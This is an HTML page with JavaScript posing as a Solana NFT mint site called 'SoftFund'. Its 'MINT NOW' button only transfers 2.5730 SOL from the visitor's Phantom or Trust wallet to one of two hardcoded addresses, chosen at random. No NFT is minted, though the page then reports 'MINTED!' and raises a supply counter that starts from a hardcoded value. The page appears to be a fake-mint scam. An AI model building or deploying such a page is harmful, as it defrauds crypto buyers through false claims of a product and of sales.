<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SoftFund | $2.5730 SOL Mint</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background: linear-gradient(135deg,#0a001f,#1b0044,#2e0055); color:#fff; font-family:'Orbitron',sans-serif; text-align:center; padding:40px 20px; }
    .container { max-width:500px; margin:auto; }
    h1 { font-size:3.2rem; color:#00ff9d; }
    .price { font-size:2.5rem; color:#ffd700; font-weight:bold; }
    button { margin:30px auto; padding:20px 45px; font-size:1.6rem; background:#ffd700; color:#000; border:none; border-radius:18px; cursor:pointer; box-shadow:0 0 25px rgba(255,215,0,.7); transition:.3s; font-weight:bold; }
    button:hover { background:#ffed4e; transform:scale(1.05); }
    button:disabled { background:#666; cursor:not-allowed; }
    .status { margin-top:15px; font-size:1rem; }
  </style>
</head>
<body>
  <div class="container">
    <h1>SOFTFUND</h1>
    <p>USA-Based | Solana Utility NFTs</p>
    <p class="price">$2.5730 SOL</p>
    <p>Supply: 10,000 | <span id="minted">312/10000</span></p>
    <button id="mintBtn">MINT NOW</button>
    <div id="status" class="status"></div>
    <div style="margin-top:50px; font-size:0.9rem; color:#aaa;">
      Phantom · Trust Wallet
    </div>
  </div>

  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
  <script>
    const PRICE = 2.5730 * 1e9; // 2.5730 SOL
    const WALLET_1 = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue"; // Phantom
    const WALLET_2 = "6v4DR5rkDFa3WdCQ35wvtfVYfk7i233Uiu6GmQ7JCdRu"; // Trust
    let provider = null;
    let connection = null;

    const status = document.getElementById("status");
    const btn = document.getElementById("mintBtn");

    // DETECT PHANTOM OR TRUST WALLET
    function detectWallet() {
      if (window.solana && window.solana.isPhantom) return window.solana;
      if (window.trustwallet && window.trustwallet.Provider && window.trustwallet.Provider.solana) return window.trustwallet.Provider.solana;
      if (window.solana) return window.solana; // fallback
      return null;
    }

    // ON PAGE LOAD — AUTO DETECT
    window.addEventListener("load", () => {
      provider = detectWallet();
      if (provider && provider.isConnected) {
        status.textContent = "Wallet connected!";
        status.style.color = "#00ff9d";
      }
    });

    // MINT BUTTON
    btn.onclick = async () => {
      provider = detectWallet();

      if (!provider) {
        status.textContent = "Phantom or Trust Wallet not found.";
        status.style.color = "#ff5555";
        return;
      }

      try {
        btn.disabled = true;
        status.textContent = "Connecting...";
        status.style.color = "#ffd700";

        if (!provider.isConnected) {
          await provider.connect();
        }

        status.textContent = "Connected! Sending $2.5730...";
        connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");

        const receiver = Math.random() < 0.5 ? WALLET_1 : WALLET_2;

        const tx = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: provider.publicKey,
            toPubkey: new solanaWeb3.PublicKey(receiver),
            lamports: PRICE,
          })
        );

        tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
        tx.feePayer = provider.publicKey;

        const signed = await provider.signTransaction(tx);
        const txid = await connection.sendRawTransaction(signed.serialize());
        await connection.confirmTransaction(txid);

        status.textContent = "MINTED! Tx: " + txid.slice(0,8) + "...";
        status.style.color = "#00ff9d";

        const count = parseInt(document.getElementById("minted").innerText.split("/")[0]) + 1;
        document.getElementById("minted").innerText = count + "/10000";

        setTimeout(() => {
          btn.disabled = false;
          status.textContent = "";
        }, 3000);

      } catch (e) {
        console.error(e);
        status.textContent = "Failed. Try again.";
        status.style.color = "#ff5555";
        btn.disabled = false;
      }
    };
  </script>
</body>
</html>
